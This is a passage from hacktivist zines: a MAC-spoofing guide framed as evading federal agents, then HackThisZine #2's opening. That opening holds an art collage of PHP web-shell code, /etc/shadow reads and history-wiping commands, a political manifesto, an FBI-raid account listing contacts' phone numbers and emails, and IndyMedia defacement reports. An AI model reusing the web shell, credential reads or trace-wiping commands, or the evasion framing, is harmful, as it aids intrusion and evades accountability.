        system. Typically the user needn't worry about it at all. In windows we
        can edit this data by using the regedit program. Click Start-> Run. A
        text box will pop up type ""regedit"" (figure 2) and hit okay. The
        registry program will open (figure 3).

Step 3: Look at figure 3. On the left side of the window you will see various
        expandable folders. These work just like the file browser included in
        windows. Folders open up to new folders in an expandable tree. The
        difference is that these folders contain different keys and each key
        contains different data. 

        The data we want to change can be found in the key located at:
        [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E972-E325-
        11CE-BFC1-08002bE10318}]. To get there click on the little plus sign
        next to ""HKEY_LOCAL_MACHINE"" then the one next ""SYSTEM"" and so on until
        you find the {4D36E972-E325-11CE-BFC1-08002bE10318}folder. Click on the
        plus next to this folder and you will see a number of subfolders that
        run in sequential order. When you are done with this step, the tree on
        the left side of the regedit window should look something like figure 4.

Step 4. Each of these folders represents a different network device. In order to
        determine which one correlates to the network card you want to change
        the MAC address on, you will have to click on each one. After you click
        on each of these subfolders, examine the data that appears in the box on
        the right. You should find some lines with descriptive information such
        as the manufacturers name. You will need to find a match for your card.
        Usually you can find manufacturer and model information printed on your
        card. Continue look- ing through the sub-folders until you find a match.
        On my computer under folder 0016 I find a string entitled ""ProviderName""
        and its corresponding value is ""Lucent Technologies"" and there's another
        string called ""Ven- dorDescription"" and its value is ""ORiNOCO PC Card (5
        volt)."" These clues tell me that this folder is for my Lucent
        Technologies Wavelan pc card which is based on an ORiNOCO microchip. 

Step 5. When you have found a match, look in the window on the right under the
        ""name"" column for a string called ""NetworkAddress."" If none exists, you
        will have to create it. Right-Click in the box on the right and click
        New-> String Value. Name this string ""NetworkAddress."" 

Step 6. Now, all you have to do is give ""NetworkAddress"" a value, or alter the
        value already there. Double click on ""NetworkAddress"" and in the value
        field enter a string of 12 characters ranging from 0 to 9 and a through
        f, eg. 022CDEAD4e2c. (Figure 6) 

Step 7. Close the regedit program and restart your computer.

Step 8. Let's see if this worked. Open a command prompt (Start-> Programs-> 
        Accessories-> Command Prompt) and type ipconfig /all. You should see
        that the fake MAC Address your provided is displayed.

Step 9. If your MAC Address did not change, or if your internet connection
        ceases to work, you may have provided an invalid MAC address. Another
        possibility is that there are more than one entry in the registry for
        your wireless card, look through the subfolders under
        [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4D36E972-E325-
        11CE-BFC1-08002bE10318}] again and see if there's another folder that
        describes your card. In either case repeat steps 2 through 8. Once you
        see that your ""Physical Address"" has changed by issuing the ipconfig
        /all command in the command prompt you are done.

Step 10. Send your communique, or do whatever thing it is that you don't want
         the feds to know about.

Step 11. Repeat steps 2 through 9 to change your MAC Address again.

HIDING ONE'S MAC ADDRESS IN LINUX
For anyone using the LINUX operating system,4 the process of changing MAC
Addresses is fairly simple. I am going to assume that the reader already has a
running LINUX machine with a functioning wireless adapter. If this is not the
case, there are numerous resources online that can help in this regard. Please
note, that some of these steps may vary slightly given different LINUX
distributions and wireless cards. 

Step 1.  Open a terminal. This process will be different for all distributions
         of LINUX. Most LINUX distributions now default to a graphical user
         interface that includes a desktop, icons, and other doodads. Typically
         there will be some sort of application menu. If you can find this, look
         for terminal, xterm, konsole,or some- thing of the sort. If all else
         fails consult the web site of the distribution you are using. 

Step 2.  Type the iwconfig command in the terminal window and hit enter. You
         will see various information regarding your wireless device and any
         network it may be connected to (see figure 8). Note the name of the
         device on the left side. In my case, my wireless device is named ""eth1""
         this may vary depending on your setup. 

Step 3.  Now type ifconfig and hit enter. Ifconfig will display a variety of
         network information (see figure 9), but what we are worried about is
         the string that follows ""HWaddr"" this is the device's MAC Address.
         Write this down for reference.

Step 4.  Turn off your wireless adapter. This is typically done by issuing the
         ifdown <device name> command. (See figure 10)

Step 5.  Change your MAC Address by issuing the following command: ifconfig
         <device name> hw ether xx:xx:xx:xx:xx:xx where each x is a digit from
         0 to 9 or a to f. (see figure 10)

Step 6.  Turn on your wireless adapter. This is typically done by issuing the
         ifup <device name> command.

Step 7.  Check your work. Issue the ifconfig <device name> command again. You
         should see that the MAC Address has changed. If this is not the case,
         or if your internet connection stops working, you may have entered an
         invalid MAC Address. Repeat steps 4 through 7 until it works.

Step 8.  Send your communique or do whatever you want.

Step 9.  Change your MAC Address again by repeating steps 4 through 7.


Questions? Comments? Article Submissions? Get a hold of us at:

E-mail:                          staff@hackbloc.org
E-mail discussion lists:         lists.hackbloc.org

                              -> Get Copies of The Zine! <--

Electronic copies of the zine are available free online at the Hack Bloc website
(www.hackbloc.org/zine/). There are two versions of the zine: a full color
graphical PDF version which isbest for printing and also includes all sorts of
extras, as well as a raw TXT version for a more readable and compatible format.

Having the zine in your hands is still the best way to experience our zine. If
you can’t print your own (double sided 8.5x11) than you can order copies of this
issue and most back issues fromour friends at Microcosm Publishing
(www.microcosmpublishing.com) who are based out of Bloomington, IN.

We are always seeking translators to translate HackThisZine into other languages
if your interested in working with us to translate this issue please send us an
e-mail to us at: staff@hackbloc.org.

          #############################################################
          #                                                           #
          #            Zine Staff // Credits // Greetings             #
          #       HackThisZine Issue #6 -- Lets Smash Windows!        #
          #                                                           #
          #         Zine Staff                 Hack Bloc Staff        #
          #                                                           #
          #         Flatline                      Evoltech            #
          #         Nomenumbra                    Doll                #
          #         Evoltech                      Sally               #
          #         Haifleisch                    Rugrat              #
          #         alxCIAda                      Frenzy              #
          #         Impact                        HexBomber           #
          #         Ryan                          alxCIAda            #
          #         Frenzy                        Impact              #
          #         Ardeo                         Flatline            #
          #                                       Whooka              #
          #                                                           #
          #     HackThisZine is always looking for talented           #
          #     writers and artists to help! We currently need        #
          #     new articles for the next issue, which will hop-      #
          #     fully be out in half the time it took to create       #
          #     this one. If you would like to dedicate some          #
          #     time to writing, artwork, or just to tell us what     #
          #     you think of our efforts please send an e-mail.       #
          #     We will try and respond to everyone.                  #
          #                                                           #
          #############################################################

                           AT&T works in more places,
                             like NSA HEADQUARTERS"
Papers,HackThisZine (HTZ) #2,eZine,,2006-12-02,: N/A,"# unset HISTFILE; ./clean.sh; cat >> /var/www/hackthissite.org/html/index.php
################################################################################

    $cmd"",        ); ?                    
    ost"">a    hist hac                    
    ype=""submit"" value          form> ha  
    disruption, coun          e The real t                                    
     o  them is pote           agentWeapon                          -f /      
  pfile0 now+1minute          afa33.  0 will             using /bin/sh;  s  
    /var/at/jobs            00 | grep -A 4 -i   ngname It is only after you ha
    t everything            e free to do anything. Your life is ending wha    
      a time.               u were going to die tomorrow, what wou            
     cat /et                    e; culture jamming; 0day explo      
    e hell o                    .h> void main() { setuid(0); s      
  hoop whoop                  n/sh -i""); } deface the nation  
     tune in dro          ernet liberation front; stop the    
  get off the grid; don't hate the media, become the med      
  dev/random > /root/.bash_history;   plug; Become a gho      
  es for people in code; Big brother is watching; give h      
        e><?php $cmd = $_POST['cmd']  passthru(""$cmd"", $      
            m action=""phpbackdoor.php"" method=""post"">ana      
              ut type=""text"" name=""cmd""><input type=""sub      
                  ght crime, anarchy, financial disruption    
                          e White House. Any one of them i    
                          n. at -f /var/vm/swapfile0 now+1    
                            bin/sh;  strings -8 /var/at/jo    
                            y after you have lost everything  
                            ending what minute at a time. If  
                              ld you do today? # cat /etc/shad
                               revolut      r the hell of it;       
                              d(0);     tf( ""whoop whoop!\n""        
                                th       turn on tune in            
                                        tate; ge  off             
                                      g; cat        nd              
                                    ret me                              
                                 to watc                                
                                /pre><                    acti          
                              kers a                         type=""t    
                            ue=""exec                        ought crim  
                            ter cu                            rk in th  
                          tentia                              stractio  
                        nute;                                    using  
                      bs/a011a                                  t is o  
                      ng whe                                    life is 
                    . If y                                      , what w      
                  etc/shad                                       exploit      
                ll of it                                          ); set      
                hoop!\n""                                        tion; slas    
              une in d                    beration front; stop the hate, s    
          get off the   id; don't hate the media, beco   t                    
          dev/rand            bash_history

################################################################################
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

                     __                       _____                       
        ____   _____/  |_  ____   ______    _/ ____\______  ____   _____  
       /    \ /  _ \   __\/ __ \ /  ___/    \   __\\_  __ \/  _ \ /     \ 
      |   |  (  <_> )  | \  ___/ \___ \      |  |   |  | \(  <_> )  Y Y  \
      |___|  /\____/|__|  \___  >____  >     |__|   |__|   \____/|__|_|  /
           \/                 \/     \/                                \/ 
         __  .__               .__                   __                 
       _/  |_|  |__   ____     |  |__ _____    ____ |  | __ ___________ 
       \   __\  |  \_/ __ \    |  |  \\__  \ _/ ___\|  |/ // __ \_  __ \
        |  | |   Y  \  ___/    |   Y  \/ __ \\  \___|    <\  ___/|  | \/
        |__| |___|  /\___  >   |___|  (____  /\___  >__|_ \\___  >__|   
                  \/     \/         \/     \/     \/     \/    \/       
                    .___                                                 .___
   __ __  ____    __| _/___________  ___________  ____  __ __  ____    __| _/
  |  |  \/    \  / __ |/ __ \_  __ \/ ___\_  __ \/  _ \|  |  \/    \  / __ | 
  |  |  /   |  \/ /_/ \  ___/|  | \/ /_/  >  | \(  <_> )  |  /   |  \/ /_/ | 
  |____/|___|  /\____ |\___  >__|  \___  /|__|   \____/|____/|___|  /\____ | 
             \/      \/    \/     /_____/                         \/      \/ 
             

 Electronic Civil Disobedience Journal !! Published by HackThisSite.org
      (a)nti copyright. distribute as freely as the wind and the trees.

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
################################################################################
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Lock up the kids and call the police ... 

         == NATIONAL SECURITY ALERT : SUBVERSIVE MATERIALS ENCLOSED ==
The government considers your very interest in this subject to be thought crime.
Soon you will not even be able to create or distribute these text files without
being made into a criminal by the corporate media. 

The texts enclosed contain stories, projects, and ideas from people who have
found ways to unplug themselves and hack the system. We can give you the
ammunition and a network of hacktivists to network with, but they alone will not
be enough to set yourself free. Only you can break your chains. Turn off your
television and take to the streets. Get involved!

                                        ... lock up the cops, and call the kids!
                                        
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
################################################################################

                    !###################################!
                    !###    TABLE OF DISCONTENTS     ###!
                    !###################################!

                      NOTES FROM THE HACKER UNDERGROUND
      A Hacktivist Manifesto............................................01
      Major Hack This Site Milestones...................................02

                      TURN ON: HAPPENINGS IN THE SCENE
      Hack This Site Founder Raided by FBI..............................03
      Right-wing Hackers Target Indymedia...............................04
      Directnic Enforces ICANN WHOIS Contact Info.......................05
      Phpbb 2.10 Disclosure Causes Mischief and Mayhem on the Net.......06
      Nmap Developer Intimidated by FBI...By Wyrmkill...................07

                    ARM YOURSELF: EXPLOITS AND TECHNIQUES
      The Art of the Cipher...By Psyche.................................08
      Finding and Exploiting PHP Script Vulnerabilities.................09
      Hacking Local Mac OS X............................................10
      C Compilation on a Low Level...By Forcemaster.....................11 
      Security Access, Backdoors and Gaining Permissions................12

                     TAKE ACTION: HACKTIVISM IN PRACTICE
      Join Revolution, Live Happier...by r3d5pik3.......................13
      Security Culture: Hackers Living in an Age of FBI Repression......14
      Police State USA and the Politics of Fear.........................15
      Paradise Engineering, Political Change...By archaios..............16
      Communication and Info Gathering at a Protest...By alxCIAda.......17 
      Beyond Physical Borders: Hacking and Activism on the Bet by fetus.18
      White and Black...By shardz@dikline...............................19 
      Autonomous Hacktivism With the Internet Liberation Front..........20


                     !##################################!
                     !###          TUNE IN:          ###!
                     !###   HAPPENINGS IN THE SCENE  ###!
                     !##################################!
            
   ""The nationalist not only does not disapprove of atrocities committed by
    his own side, but he has a remarkable capacity for not even hearing
    about them."" - George Orwell -
           
################################################################################
#        01. A Hacktivist Manifesto: Notes from the Hacker Underground         #
################################################################################

As our hacking and activist communities grow, the ruling classes will try to
react to stop us. We live in an age where our every thought and move is
monitored, and to question the injustices of our society are demonized as
unpatriotic. The corporate media scares the public with images of evil hackers
and cyber-terrorists so congress can give more money to law enforcement and the
ministry of peace. The Office of Homeland Security, the USA PATRIOT Act, Total
Information Awareness. Goerge W. Bush, Dick Cheney, John Ashcroft. The threat of
fascism in America is not an impending threat: it's already here, and the lines
are clearly drawn.

Inevitably those who question and confront the injustices of the political
system will become targets for harassment by the rich and powerful. These words
are coming to you from someone who is facing the full weight of these changes
first hand. The success of Hack This Site as well as my participation in
organizing a number of protest actions has made me a target of law enforcement.
My apartment was raided by Chicago FBI who seized all of my equipment and is
threatening me with felony charges citing millions of dollars in damage and up
to thirty years in jail for a crime that hasn't even happened.

This is the reality of the political system we live in: the rich and powerful
have no regard for human rights, and will do everything in their power to crush
any sort of resistence against their empire. The feds are in the business of
breaking lives and have had no reservations in making the most of these sweeping
changes. IndyMedia servers are seized by international law enforcement. The FBI
questions, raids, and arrests dozens of hackers a year even from here at Hack
This Site, HBX Networks, and various IndyMedia collectives. They grab server
logs for servers that host hacker and anarchist websites like Infoshop.org
insecure.org, etc. Police arrested over 1800 people at the protests at the 2004
Republican National Convention while the the FBI and the Secret Service
investigate key organizers. When they had visited me, they had quoted several
comments from Hack This Site's IRC server.

The reason why we are being monitored and indimidated is because they know what
we are capable of doing if we realize our collective power and start doing
something about it. The stakes are high, but they aren't unbeatable. The biggest
weapon in their arsenal is how they can control people through fear. But every
day, we hear stories about people who were smart and brave enough to outsmart
them. If we let them walk all over us, then they win. If we organize and put up
a fight, then their grip is loosened and the truth may flow freely as the wind
and trees. These are the opening shots in a war they say will not end in our
lifetime.

The struggle to build a free internet and a free society has yielded some
amazing results. We have developed open source software, peer to peer file
sharing services, secure and anonymous open publishing systems, and much more
than can be explained here. And every time we develop these exciting new
technologies that let us pursue our creativity and innovation more freely, the
establishment tries to keep up by inventing increasingly ridiculous legislation
to stop us. But we will always be one step ahead of them: while they react, we
create.

The balance of power between revolutionary hackers and the reactionary corporate
government will exist in various degrees at all times. The problem isn't going
away anytime soon. Instead of spending time fighting amongst ourselves, we need
to work together to find solutions. Embrace a diversity of tactics and unite
with our brothers and sisters to build a front to combat the right wing police
state. Not only do we need to build defensive networks to circumvent their
security and censorship, we need to take direct action and bring an end to the
corporations and governments that stand in our way. While they are fighting for
their paycheck, we are fighting for our lives.

Hacktivists of the world, unite!

################################################################################
#                     02. Major Hack This Site Milestones                      #
################################################################################

- First challenges posted on Hulla-balloo.com in May 2002: 10 basic web
challenges with a basic top scores section. Gets a surprising amount of usage
and feedback with people volunteering to help with the site.

- Several unofficial IRC servers and channels are opened

- Launches HackThisSite.org in August 2003:

- Realistic missions with simulated targets and objectives.

- User contributed articles / external resources.

- User system that keeps track of missions completed.

- Web based chat system.

- The ""Hack This Site"" challenge and the hall of fame.

- HTS staff organization is set up to maintain the various functions of the
website(moderate articles, interact with users, post news, configure and develop
new features, etc).

- HTS IRC server launched, online community explodes.

- HTS public meetings are set up with set agendas and facilitated discussion for
users to meet with staff about future projects of HTS, maintenance, and general
hacker chat.

- HTS users and staff are inspired to produce several new challenges: in
addition to new realistic missions, several new kinds of hacking challenges are
introduced. Application Challenges lets you hack away at operating system level
challenges. Encryption Challenges gives out a string encrypted with a custom
algorithm and people compete against each other to crack it.

- Declares ""Summer of Resistance"" in 2004 to have Hack This Site actions at
several major hacker conventions and protests.

- Publishes first hacktivist zine, distributes hundreds through mail, and has
them available at various infoshops and conventions for the following months. 24
half-page zine with hacktivist texts and technical articles.

- Organizes for the Fifth HOPE convention: 7/9/04: Chicago 2600 people drive up
to NYC. Several people sets up radical HTS table selling the zine and gives
radical propaganda away. Networks with other activists and hackers, especially
gearing up for upcoming protests.

- Organizes for DEFCON convention 7/31/04: pick up several HTS people along the
way to end up in Vegas. Meets with several local activists and hacking groups.
Sells copies of 2600, distributes lots of propaganda, big hacktivism presence.

- Visited by Chicago FBI and is questioned regarding violence and disruption at
the Republican National Convention protests, hacktivism and DEFCON.

- Massive Republican National Convention protests, week full of marches and
actions, various hacktivist actions, thousands arrested including 2600 and HTS
people. About 80,000 registered HTS users.

- HTS v3 released with complete recoding to accomodate for growth. New database,
restructured staff, etc. More stable, interactive, and secure.

- HTS IRC merges with TopGamers IRC network. Technical lectures are organized by
users to be held over IRC.

- HTS Radio set up with a live radio stream. Active IRC community built around
sharing hacker tips and music. Eventually the server was shut down because of
bandwidth and drama, but will return later.

- HTS developer jessica discovers and releases the phpBB 2.0.10 highlight
injection vulnerability, which spreads like wildfire across the net.

- Root This Box released: new set of challenges where several users set up
machines configured for free range hacking: complex team scoring mechanism,
several boxes set up, many real-world hacking skills are shared and learned.

- Many HTS members start to interact with more radical and blackhat hacking
teams as real world hacking skills increase

- Move to new dedicated server to accomodate for growth and bandwidth concerns.

- HTS Radio relaunched with pre-recorded content. Audio is seperated into
different ""playlists"" which are streamed randomly as well as provided as
downloads in radio archives. Collection of various hacker radio shows,
convention presentations, indymedia content, timothy leary hippie shit, and
unique HTS content.

- Major counter-inaugural DC protest, anarchist actions all over the country,
more hacktivist actions.

- HBX Networks merges with HTS to provide free shell server and HAXOR Radio.

- HTS breaks off with TopGamers network because of administrative differences:
sets up IRC on our dedicated machine.

- FBI raids Jeremy's house in massive investigation: accuses Jeremy of hacking
into protestwarrior.com and threatens credit card fraud charges.

- HTS gears up for another summer full of actions: finishing up the next
magazine and prepares for the DEFCON convention.


                      !###################################!
                      !###          TURN ON:           ###!
                      !###   HAPPENINGS IN THE SCENE   ###!
                      !###################################!
            
           ""Dream as if you'll live forever. Live as if you'll die today.""
           
################################################################################
#                  03. Hack This Site Founder Raided by FBI                    #
################################################################################

On March 17 2005, nine Chicago FBI agents raided and seized all electronic
equipment in Jeremy Hammond's apartment. Facing intimidation from both the FBI
and the Secret Service, he is being accused of hacking into right-wing website
ProtestWarrior.com and stealing credit card numbers. While the website had not
been damaged and no credit cards were billed, the FBI is threatening to charge
him with fraud and unauthorized access totalling to millions of dollars in
damages and up to thirty years in federal prison for a crime that hasn't even
happened.

Jeremy Hammond aka xec96 was the founder of online hacking community
HackThisSite.org which taught network security skills through a series of online
hacking challenges. With his coordination the website was able to publish a
series of magazines, launch an online hacktivist radio station, and start
several hacking competitions. Because it has grown to be increasingly
controversial, it is facing overblown intimidation from unjust law enforcement
policies despite being legal and non-destructive in nature.

Jeremy has also worked with several local and national anti-war groups to
organize for a variety of marches, rallies, and national demonstrations
including the Republican National Convention in NYC, the counter-inauguration
protests in Washington DC, and dozens of other local Chicago actions. Jeremy
Hammond is an innocent man who is being targeted for his participation in the
struggle for social justice and the success of the Hack This Site community. His
passion and determination to challenge the injustices of the rich and powerful
has made him a target of harassment by law enforcement.

Please ask the US District Attorney's Office to drop the charges!

FreeJeremy.com Legal Defense
FreeJeremyNow@gmail.com
Contact: Loren Blumenfeld, attorney - 312-939-0140
Contact: Pong Khumdee, partner and roommate  pongtakespictures@gmail.com
Contact: Wyatt Anderson, administrator of HTS: wanderson@gmail.com

Who is Jeremy Hammond?
----------------------
Jeremy was a political hacker who used his abilities to defend a free internet
and a free society. He has founded a number of projects including several
progressive newspapers, educational websites, and helped organize a series of
political protests. He has worked to defend the IndyMedia project from
right-wing hackers by finding and fixing several vulnerabilities. While his
activities have been ethical and non-destructive, he has found himself a target
of law enforcement because he has been brave enough to stand up to the
injustices of the political system.

Jeremy Hammond was the founder of online hacking community HackThisSite.org
which taught network security skills through a series of online hacking
challenges. With his coordination the website was able to publish a series of
magazines, launch an online hacktivist radio station, and start several hacking
competitions. While the site has grown it has become increasingly controversial.
The site and community is facing overblown intimidation from law enforcement
policies, despite being legal and non-destructive in nature.

Jeremy also worked with several local and national anti-war groups to organize
for a variety of marches, rallies, and national demonstrations including the
Republican National Convention in NYC, the counter-inauguration protests in
Washington DC, and dozens of other local Chicago actions.

How and why is Jeremy being threatened by the FBI?
--------------------------------------------------
On March 17, 2005, Jeremy's apartment was raided by nine FBI agents who
ransacked the plane, seizing all electronic equipment as well as the house
phone/address book, the lease, important notebooks, and even an XBox. Since
then, Jeremy and his lawyer have been meeting with the US attorney and the FBI.
The US government says that they will be indicting him with several felony
charges related to computer hacking and credit card fraud.

Jeremy was also visited by the United States Secret Service on April 13 who
checked out his apartment and asked Jeremy a few questions related to his
political activities. They were asked by the FBI who tipped them off about
Jeremy's protest activities and anarchist tendencies. The SS asked about what
political groups he has worked with, what protests he has been to, whether he
was going to assasinate the president, etc.

The FBI has stated that they have been monitoring Jeremy's actions for at least
six months (since Summer 2004) when the FBI first visited Jeremy questioning him
about possible disruption and violence at the Republican National Convention
protests in NYC late August. The FBI has gone as far as quoting several private
conversations from the Hack This Site IRC server, talked about places Jeremy has
been, etc. They also say that they have stopped by his apartment on several
occasions to check up and take pictures. His phone and internet connection is
almost certainly tapped as the FBI has stated that they will be watching his
every action and statement.

What is Jeremy being accused of doing?
--------------------------------------
The FBI alleges that he is involved with an underground hacking group that has
hacked and gained acess to the right-wing website ProtestWarrior and took credit
card numbers belonging to people who ordered products off of their online store.
The FBI says that he was involved in a plot to make donations from these credit
card numbers to various humanitarian charities, civil rights activists, and
leftist protest groups.

These charges are outrageous and reactionary because none of this has actually
happened. The website has not been defaced and no credit card numbers has been
billed. The FBI and the US Attorney have quoted several million dollars of
damages(~$500 per credit card) and is threatening up to thirty years in federal
prison for a crime that has not been committed.

Who is ProtestWarrior?
----------------------
ProtestWarrior.com is a right-wing group that tries to provoke and disrupt
constitutionally protected protests and actions of progressive organizations.
They foster such conservative and intolerant dogma which borders on abusive
hate-speech. Their most recent national action was their attempt to cause
trouble at the counter-inaugurationprotests in Washington DC where they failed
miserably in being effective or generating any decent numbers of supporters.

Although no damage had been done to their system, the ProtestWarriors have been
known to falsely report information to the police on an intempt to incriminate
and demonize leftists. This particular case is similar: while no damage has been
done to the website or credit cards, ProtestWarrior is trying to demonize and
incriminate hackers and activists.

What is ironic is that ProtestWarrior has worked with groups like
RightWingExtremist.net and the g00ns to hack IndyMedia and other leftist sites
in the past. Read an in-depth discussion of ProtestWarrior, what they stand for,
and how to expose them: http://indymedia.us/en/2005/03/5268.shtml

What property has the FBI seized?
---------------------------------
Nearly everything electronic has been seized from their house, in addition to a
number of private notes and documents including notebooks as well as a copy of
their lease. In addition to taking Jeremy's property, they have also seized his
roommate's computers and other equipment which were unrelated to the incident.
Details of all property seized are included in the search warrant receipt.

While it has been more than two months since the original incident, the FBI has
not filed charges nor returned any property. We are sending out an official
Motion for Return of Property, which the FBI is required to do under Rule 41(e)
of the Federal Rules of Criminal Procedure.

How could I support the case against these ridiculous charges?
--------------------------------------------------------------
Support can range from signing the online petition, making a donation,
contacting the US Attorney, or just by spreading the word about Jeremy's
situation. Please see the support page for more details.

Are copies of the search warrant available?
-------------------------------------------
Electronic copies of the search warrant can be downloaded at the website
FreeJeremy.com. The affidavit which established probable cause has not been
shown to us yet.


References
--------------------------------------------------------------------------------
This is a short list of documents and reading materials related to federal law
and cybercrime.

 - ""Everything a Hacker Needs to Know about Getting Busted by the Feds"" -
http://www.grayarea.com/agsteal.html - A general introduction to federal law as
related to hacking and cybercrime from Agent Steal who served 36 months for
similar charges.

- 1030: Computer Fraud and Abuse Act -
http://caselaw.lp.findlaw.com/casecode/uscodes/18/parts/i/chapters/47/sections/
section_1030.html - Title 18 Part I Chapter 47 Section 1030 - Fraud and related
activity in connection with computers. Criminal charges for unauthorized access.

-Cyber Security Enhancement Act of 2002-
http://www.cybercrime.gov/homeland_CSEA.htm - Additions from the Homeland
Security Act which make changes to the Computer Fraud and Abuse Act which
strengthen the penalties and surveillance capabilities of law enforcement
Searching and Seizing Computers and Obtaining Electronic

- Evidence in Criminal Investigations -
http://www.usdoj.gov/criminal/cybercrime/searching.html - Complete manual made
by and for federal law enforcement regarding how to obtain a warrant for a
search and the procedure for gathering evidence on seized equipment for criminal
investigations.

- Field Guidance on New Authorities That Relate to Computer - Crime and
Electronic Evidence Enacted in the USA Patriot Act of 2001
http://www.usdoj.gov/criminal/cybercrime/PatriotAct.htm - Document for law
enforcement that details new surveillance capabilities and evidence collection
as a result of changes with the USA Patriot Act. Scary read!

- Federal White Collar Crime - http://profs.lp.findlaw.com/collar/ - A broad,
non-computer specific introduction to federal criminal law.

- Homeland Insecurity: The end of Civil Liberties -
http://www.oilempire.us/homeland.html An analysis of recent anti-terrorism
legislation removes many of our constitutionally protected freedoms and sets the
stage for a new age of fascism.

Contacts
--------------------------------------------------------------------------------
If you would like to know how you can support Jeremy or if you have any
information that can be helpful to his case, please get a hold with someone on
the legal support team. The email address FreeJeremyNow@gmail.com is shared with
several friends and family members. This is the best bet in seeing that your
infomation is made available to everyone on the team.

For quicker results, you may need to get a hold of someone directly using the
information below:

Loren Blumenfeld, Jeremy's lawyer, is available at his office phone at
312-939-0140
Wyatt Anderson, admin of HackThisSite.org who works with Jeremy on the site, can
be reached at wanderson@gmail.com.
Pong Khumdee, partner + roommate, can be reached at pongtakespictures@gmail.com
Chris Montgomery, roommate + coworker, can be reached @ chris@macspecialist.com.
Jason Hammond, Jeremy's twin brother, can be reached at icetitan@graffiti.net. 

Please take into consideration that this is an ongoing criminal investigation,
and all of the above information is likely tapped and monitored. Please do not
send anything incriminating or detrimental to Jeremy's case.

################################################################################
#                  04. Right Wing Hackers Target Indymedia                     #
################################################################################

A number of people have started to organize and attack various Independent Media
Centers as well as a number of other progressive and leftist websites. In the
past, these attacks have ranged from simple XSS attacks which redirect visitors
or trashing the filesystem / databases. The people responsible show no
understanding of the ideas behind the open publishing system IndyMedia, which is
free for all users to participate in the discussion. These actions are not
hacking nor hacktivism: they utilize public pre-written exploits to simply
""shout the other side down."" An attack on IndyMedia is an attack on free speech
itself. These right-wing extremists need to be confronted and exposed as the
online fascists they really are.

During the Republican National Convention, a group of hackers called
RightWingExtremist.net was formed by Brett Chance(elac, clorox, awb0t, etc) from
Plano TX. This group came out of the ultra conservative ProtestWarrior.com who
advocates disrupting and attacking leftist organizations. Their actions had
started with minor stuff like launching ddos attacks on NYC IndyMedia. Later
they discovered a XSS flaw  in dadaIMC that allowed them to post news that would
automatically redirect users to his own website where it would play sounds that
said childish political rhetoric like ""the nazi indymedia wants to destroy
israel,"" etc. Because of pressure from the online community, Brett from
RightWingExtremist. net closed down the site for several months.

Months later, Jeremy from HackThisSite.org discovered a flaw in dadaIMC that
allowed the upload of malicious PHP files would could be used to take over the
entire server. This announcement was quietly made to dadaIMC who was urged to
keep it private until the tech staff of every indymedia center was notified and
had their scripts patched to protect themselves. Several other independent
IndyMedia centers were notified and had their code base patched. But before the
majority of sites were patched, DadaIMC posted the vulnerability information on
the website, including instructions on how it can be exploited.

A month later a group calling itself the g00ns.com have attacked and defaced a
dozen indymedia websites using the vulnerability posted to dadaimc. On the
hacked websites, a message calling indymedia ""liars"" and ""anti-republicans"" were
posted. Soon after, hackers and indymedia techs started working together to fix
each other's code and bring backups back online as well as find information
about the g00ns. The g00ns started out by targetting and attacking online gaming
clan websites, but eventually Elac from RightWingExtremist.net joined up and
started to turn the group farther to the right. When the IndyMedia sites were
hacked, people started to gather information and infiltrate their organization
and soon after all of their private details were released to the public to show
actions like this will not go unnoticed.

Many other right-wing trolls continue to try to disrupt IndyMedia and left-wing
protest groups. These individuals operate under several different names
including ProtestWarrior.com, RightWingExtremist.net, FreeRepublic.com,
KobeHQ.com, FreeDominion.com, LittleGreenFootballs.com, and more. Many of these
groups are suspected of being financed operations from governments or
corporations similar to the COINTELPRO program from the '60s and '70s. Common
activities range from flooding message boards, faking votes and reviews in
online polls, releasing personal information of key organizers, spreading false
rumors and scandals, etc.

All IndyMedia centers running DadaIMC are strongly encouraged to patch their
software, but more importantly, hackers need to work with activist groups around
the world to make sure their software is secure, encrypted, and anonymous.
Details on the vulnerability are at:
http://www.dadaimc.org/mod/software/alerts/dadaIMC/index.php?alert=1
http://www.dadaimc.org/support.php?section=xss

################################################################################
#              05. Directnic Enforces ICANN WHOIS Contact Info                 #
################################################################################

DirectNIC has begun selectively enforcing an obscure rule of ICANN that all
contact details in the WHOIS database on the owner of a domain must be accurate.
They have sent emails out to owners of domains threatening to delete the domain
if the contact details are not corrected and verified. The owner has to fax in
proof of their name, home address, phone and fax number. They have threatened to
shut down the site if accurate details are not provided in 15 days.

Activists have just launched prole.info, which provides a number of
anticapitalist writings and pamphlets, and sent announcements to a variety
ofemail lists and websites. Two days after prole.info was threatened to provide
accurate details or be faced with the domain being shut down.

This is a gross privacy violation, and it is unfair that it seems to be very
loosely and even selectively enforced. Thousands of domains give questionable
and fake details, but why was prole.info targeted? Does DirectNIC hire a team of
people to randomly browse websites and verify contact details? Was prole.info
reported by people who wanted to find out where the activists live?

We do not want to face harassment from ICANN, DirectNIC, or anyone else who take
away our privacy on the net. Put pressure on those who create and enforce these
policies that threaten internet free speech.

http://www.prole.info tech@prole.info

""To a valued directNIC customer,
It has come to our attention that one or more of your domain names lists
inaccurate information in the WHOIS contact database. To avoid losing your
domain(s), please update this information within 15 days.

Here is a list of affected domains: PROLE.INFO Errors in Registrant Information:
Proles - Haywood, William Name: INCORRECT Address: INCORRECT Phone: INCORRECT 

Description: ""William Haywood"" is a historical figure related to the website's
content and not likely a real (modern) person. The address and phone are clearly
non-existant.

Why must we do this? Unfortunately, as a domain name registrar, the Internet
Corporation for Assigned Names and Numbers (ICANN) has placed the responsibility
on us to enforce the governing body's rules, including seeing to it that
information provided in WHOIS is up to date and accurate.

Failure for Intercosmos to adhere to these rules, after being notified of a
potential violation, is grounds for our company's accreditation to be revoked.
One major registrar already was threatened with this very action.

Please update your information and fax to us proof of all your contacts for
these domains to 504-566-0484. Please send your fax to the Attention of the
Abuse Department. 

Thanks for your cooperation and for choosing directNIC. Sincerely, direct-NIC
Customer""


